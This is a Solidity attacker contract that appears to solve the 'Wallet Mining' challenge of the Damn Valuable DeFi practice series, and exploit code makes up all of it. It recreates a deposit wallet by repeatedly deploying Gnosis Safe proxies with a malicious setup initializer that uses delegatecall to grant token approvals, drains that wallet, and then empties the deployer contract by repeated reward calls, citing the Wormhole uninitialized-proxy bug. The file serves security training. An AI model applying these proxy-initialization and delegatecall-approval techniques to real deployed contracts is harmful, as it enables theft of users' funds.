// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";
import "./WalletDeployer.sol";
import "../backdoor/TokenApprove.sol";

contract WalletMiningAttacker {
    TokenApprove approver = new TokenApprove();

    function attack(WalletDeployer walletDeployer, address depositAddress, address receiver) external {
        DamnValuableToken token = DamnValuableToken(walletDeployer.gem());
        GnosisSafe copy = GnosisSafe(payable(walletDeployer.copy()));
        IGnosisSafeProxyFactory fact = IGnosisSafeProxyFactory(walletDeployer.fact());

        // 1. drain deposit wallet
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        bytes memory approveAction = abi.encodeWithSignature("approve(address,address,uint256)", address(token), address(this), type(uint256).max);
        bytes memory initializer = abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            owners,
            1,
            address(approver), // to => setupModules(to, data); => delegatecall
            approveAction, // data => setupModules(to, data); => delegatecall
            address(0), // fallback manager
            address(0),  
            0, 
            address(0)
        );

        // create proxy until deposit address is reached and then drain funds from it
        // this uses the same method of the challenge "backdoor"
        for (uint256 i=0; ;i++) {
            address proxy = fact.createProxy(address(copy), initializer);
            if (proxy == depositAddress) {
                console.log("deposit address recreated at: ", i, proxy);
                uint256 balance = token.balanceOf(proxy);
                token.transferFrom(proxy, receiver, balance);
                break;
            }
        }

        // // 2. drain walletDeployer
        // case ref: https://medium.com/immunefi/wormhole-uninitialized-proxy-bugfix-review-90250c41a43a
        uint256 pay = walletDeployer.pay();
        uint256 totalNumOfCalls = token.balanceOf(address(walletDeployer)) / pay;
        for (uint i = 0; i < totalNumOfCalls; i++) {
            walletDeployer.drop("0x");
        }

        token.transfer(receiver, token.balanceOf(address(this)));
    }
}